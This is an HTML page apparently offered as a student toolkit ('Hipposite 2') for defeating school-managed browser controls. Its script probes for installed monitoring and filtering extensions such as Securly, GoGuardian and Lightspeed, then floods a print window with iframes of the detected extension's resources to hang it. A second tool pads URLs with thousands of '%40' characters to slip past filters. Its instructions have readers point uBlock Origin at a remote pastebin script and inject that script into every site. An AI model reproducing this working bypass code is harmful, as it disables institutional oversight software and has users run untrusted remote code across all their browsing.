<!DOCTYPE html>

<html>

    <head>

        <meta charset="utf-8">

        <title>Hipposite 2</title>

        <meta name="description" content="Hipposite Rebooted | All in one. To-Go and free.">

        <meta name="viewport" content="width=device-width, initial-scale=1">

        <link rel="icon" href="../img/hippologo.png" type="image/png">

        <style>
            :root {
                --main: #d9d6ff;
                --text: #000000;
                --accent: #b3c7ff;
                --accent2: #ad9eff;
                --accent3: #4527f1;
                --border-radius-md: 15px;
                --border-radius-lg: 30px;
                --border-radius-sm: 5px;
            }

            @media (prefers-color-scheme: dark) {
                :root {
                    --main: #06000f;
                    --text: #68c71b;
                    --accent: #0b001d;
                    --accent2: #0e0125;
                    --accent3: #350a0a;
                }
            }

            body {
                margin: 0;
                padding: 0;
                background-color: var(--main);
                justify-content: center;
                text-align: center;
                color: var(--text);
                font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
            }

            h1 {
                font-size: 5rem;
            }

            h2 {
                font-size: 2.5rem;
            }

            h3 {
                font-size: 1.5rem;
            }

            a {
                color: var(--accent3);
                font-weight: bold;
                text-decoration: none;
            }

            a:hover {
                color: var(--text);
            }

            ::selection {
                background-color: transparent;
                color: var(--accent3);
            }

            .header{
                background-color: var(--accent);
                margin: 10px;
                padding: 20px;
                width: fit-content;
                height: fit-content;
                border: var(--text) 4px solid;
                border-left: var(--text) 1px solid;
                border-top: var(--text) 1px solid;
                border-radius: var(--border-radius-md);
                box-shadow:3px 3px 6px rgba(0, 0, 0, 0.13), 3px 3px 6px rgba(0, 0, 0, 0.13), 3px 3px 6px rgba(0, 0, 0, 0.13);
                transition: ease-in-out 0.2s;
            }

            .header:hover {
                transform: scale(1.01);
                box-shadow:3px 3px 6px rgba(0, 0, 0, 0.13), 3px 3px 6px rgba(0, 0, 0, 0.13), 3px 3px 6px rgba(0, 0, 0, 0.13);
            }

            .urlUblocker input {
                margin: 5px;
            }

            #utilities {
                display: flex;
                flex-direction: row;
                flex-wrap: wrap;
                gap: 10px;
                justify-content: center;
                align-content: center;
                height: fit-content;
                width: 60vw;
                margin: 10px auto;

                background-color: var(--accent2);
                border: var(--text) 4px solid;
                border-left: var(--text) 1px solid;
                border-top: var(--text) 1px solid;
                border-radius: var(--border-radius-md);
                box-shadow:3px 3px 6px rgba(0, 0, 0, 0.13), 3px 3px 6px rgba(0, 0, 0, 0.13), 3px 3px 6px rgba(0, 0, 0, 0.13);
                transition: ease-in-out 0.2s;
            }

            #utilities:hover {
                opacity: 0.85;
            }

            #utilities div {
                min-height: 60px;
                max-height: fit-content;
                width: 100%;
                flex: 1 1 30%;
            }

            #utilities #bookmarklets {
                height: 10vh;
                flex-basis: 100%;
            }

            input[type=range]{
                -moz-appearance: none;
                -webkit-appearance: none;
                appearance: none;
                height: 12px;
                background-color: var(--accent2);
                border: var(--text) 2px solid;
                border-top: var(--text)1px solid;
                border-left: var(--text)1px solid;
                border-radius: var(--border-radius-sm);
            }

            input[type=range]::-moz-range-thumb{
                -moz-appearance: none;
                appearance: none;
                height: 16px;
                width: 16px;
                background-color: var(--accent2);
                border: var(--text) 2px solid;
                border-top: var(--text)1px solid;
                border-left: var(--text)1px solid;
                border-radius: var(--border-radius-sm);
            }

            input[type=range]::-webkit-slider-thumb{
                -webkit-appearance: none;
                appearance: none;
                height: 16px;
                width: 16px;
                background-color: var(--accent2);
                border: var(--text) 2px solid;
                border-top: var(--text)1px solid;
                border-left: var(--text)1px solid;
                border-radius: var(--border-radius-sm);
            }

            input[type=range]::-moz-range-progress {
                background-color: var(--accent3);
                height: 100%;
                width: 100%;
                border-radius: var(--border-radius-sm);
            }

            input[type=range]::-webkit-progress-value {
                background-color: var(--accent3);
                height: 100%;
                width: 100%;
                border-radius: var(--border-radius-sm);
            }

            input[type=text] {
                -webkit-appearance: none;
                -moz-appearance: none;
                appearance: none;
                height: 1rem;
                width: 10rem;
                color: var(--text);
                background-color: var(--accent2);
                border: var(--text) 3px solid;
                border-top: var(--text) 1px solid;
                border-left: var(--text) 1px solid;
                border-radius: var(--border-radius-sm);
                transition: ease-in-out 0.2s;
            }

            input[type=text]:focus {
                opacity: 0.8;
            }

            select {
                -moz-appearance: none;
                -webkit-appearance: none;
                appearance: none;
                color: var(--text);
                background-color: var(--accent2);
                border: var(--text) 2px solid;
                border-top: var(--text)1px solid;
                border-left: var(--text)1px solid;
                border-radius: var(--border-radius-sm);
            }

            button {
                -moz-appearance: none;
                -webkit-appearance: none;
                appearance: none;
                color: var(--text);
                background-color: var(--accent2);
                border: var(--text) 2px solid;
                border-top: var(--text)1px solid;
                border-left: var(--text)1px solid;
                border-radius: var(--border-radius-sm);
                transition: ease-in-out 100ms;
            }

            button:hover {
                transform: scale(1.1);
            }

            #overlay {
                display: none;
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                justify-content: center;
                align-items: center;
                color: white;
                backdrop-filter: blur(40px);
                font-size: 1.5em;
                font-family: "Avenir", Helvetica, sans-serif;
            }

            .hidden {
                display: none;
            }
        </style>

    </head>

    <body>

        <div class="header" style="margin: 50px auto;">

            <h1>Hipposite 2</h1>

            <h3>The ultimate tool for silly/goosie shenanigans</h3>

        </div>

        <div id="utilities">

            <div class="header">

                <form class="urlUblocker" onsubmit="openUserUrl(event)">

                    <input type="text" placeholder="URL" id="url">

                    <br>

                    <input type="range" min="350" max="1000000" value="350" id="urlslider">

                </form>

            </div>

            <div class="header">

                <select id="iframeSelect"></select>

                <br>

                <br>

                <input type="range" id="extslider" class="slider" min="0" max="1000">

                <button id="hangButton" class="submit">Hang</button>
            </div>

            <div class="header" id="bookmarklets">

            </div>

            <details>

            <summary>
                How do I use bookmarklets?
            </summary>
            <p>Install Ublock: <a href="https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm">Here</a></p>

            <p>Click on the extension and click the gears for settings</p>

            <p>Scroll to the bottom, click "I am an advanced user" and then click the new gears that pop up.</p>

            <p>Find userRecourcesLocation, and change its value from "unset" to "https://pastebin.com/raw/PPZ1T7uh"</p>

            <p>Go back to normal settings and fins the "Custom filters" tab</p>

            <p>Add "*##+js(execute_script.js)" to the filters and apply</p>

            <p>Now you can press "ctrl + ~" to open a JS popup, paste bookmarklets here.</p>

            <h3>This does not work on ALL websites.</h3>

            </details>
        </div>

        <script>
            function openUserUrl(event) {
                event.preventDefault();

                const sliderValue = document.getElementById("slider").value;
                const userUrl = document.getElementById("url").value;
                console.log(userUrl);

                let newUrl = userUrl.replace(/https?:\/\//, "");
                newUrl = "https://" + "%40".repeat(sliderValue) + "@" + newUrl;
                console.log(newUrl)

                window.open(newUrl, "_blank")
            }
            /* extPrint3r by Blobby-Boi */
            document.addEventListener("DOMContentLoaded", () => {
                const slider = document.getElementById("extslider");
                const memory = navigator.deviceMemory || 8;
                slider.value = Math.round(memory * 500);
                slider.max = Math.round(memory * 1500);
                populateSelectOptions()
            });

            document.getElementById("hangButton").addEventListener("click", () => {
                const url = document.getElementById("iframeSelect").value;
                const count = document.getElementById("extslider").value;
                print(url, count);
            });

            const extensions = {
                "Securly (3rd ID)": "chrome-extension://ckecmkbnoanpgplccmnoikfmpcdladkc/fonts/Metropolis.css",
                "Securly (2nd ID)": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
                "Securly (1st ID)": "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css",
                "GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js",
                "LANSchool": "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html",
                "Linewize": "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html",
                "Blocksi": "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html",
                "FortiGuard": "chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js",
                "Cisco Umbrella": "chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html",
                "ContentKeeper": "chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png",
                "CK-Authenticator G3": "chrome-extension://odoanpnonilogofggaohhkdkdgbhdljp/img/ckauth19x.png",
                "Securly Classroom": "chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html",
                "Hapara": "chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html",
                "Hapara (new ID)": "chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html",
                "iboss": "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html",
                "Lightspeed Digital Insight Agent": "chrome-extension://njdniclgegijdcdliklgieicanpmcngj/js/wasm_exec.js",
                "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png",
                "Lightspeed Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png",
                "InterCLASS Filtering Service": "chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html",
                "InterSafe GatewayConnection Agent": "chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js",
                "LoiLo Web Filters": "chrome-extension://pabjlbjcgldndnpjnokjakbdofjgnfia/image/allow_icon/shield_green_128x128.png",
                "Gopher Buddy": "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png",
                "LanSchool Web Helper": "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html",
                "IMTLazarus": "chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json",
                "Impero Backdrop": "chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html",
                "Mobile Guardian": "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html",
                "NetSupport School Student": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/messages.json",
                "Lightspeed Alert Agent": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/in_page.js",
                "Lockdown Browser": "chrome-extension://fogjeanjfbiombghnmkmmophfeccjdki/manifest.json",
                "Linewize Filter": "chrome-extension://ifinpabiejbjobcphhaomiifjibpkjlf/background/assets/pages/default-blocked.html",
                "Borderless Classroom Student": "chrome-extension://kdpgkligilplaanoablcpjahjjeghcl/pages/blockPage.html",
                "LockDown Browser AP Classroom Edition": "chrome-extension://djpknfecbncogekjnjppojlaipeobkmo/assets/images/icon_128.png",
                "Lugus School": "chrome-extension://eoobggamkobbcpiojefejfglbfcacgca/assets/images/icon_128.png",
                "Dyknow": "chrome-extension://kmpjlilnemjciohjckjadmgmicoldglf/ui/views/options.html",
            };
            function createPrintWindow(content) {
                const win = window.open('', '_blank');
                win.document.write(content);
                return win;
            }
            function printContent(win) {
                try {
                    win.print();
                    setTimeout(() => win.close(), 500);
                    return true;
                } catch (error) {
                    console.error('Print failed:', error);
                    return false;
                }
            }
          async function verifyExtension(url) {
                try {
                    const response = await fetch(url, {method: 'HEAD'});
                    return response.ok;
                } catch (error) {
                    return false;
                }
            }
            function generateIframes(url, count) {
                return Array.from({length: count}, () => {
                    const iframe = document.createElement('iframe');
                    iframe.src = url;
                    return iframe;
                });
            }
            async function print(url, count) {
                const printWindow = createPrintWindow('<html><body style="background:#1e1f22"></body></html>');
                const iframes = generateIframes(url, count);
                iframes.forEach(iframe => printWindow.document.body.appendChild(iframe));
                return printContent(printWindow);
            }
            let supportedExtension = false;
            async function populateSelectOptions() {
                const select = document.getElementById('iframeSelect');
                for (const [name, url] of Object.entries(extensions)) {
                    if (await verifyExtension(url) !== false) {
                        const option = document.createElement('option');
                        option.value = url;
                        option.textContent = name;
                        select.appendChild(option);
                        supportedExtension = true;

                    }
                }
                if (!supportedExtension) {
                    const option = document.createElement('option');
                    option.value = null;
                    option.textContent = 'No Supported Extensions';
                    select.appendChild(option);
                }
            }
        </script>

    </body>

</html>
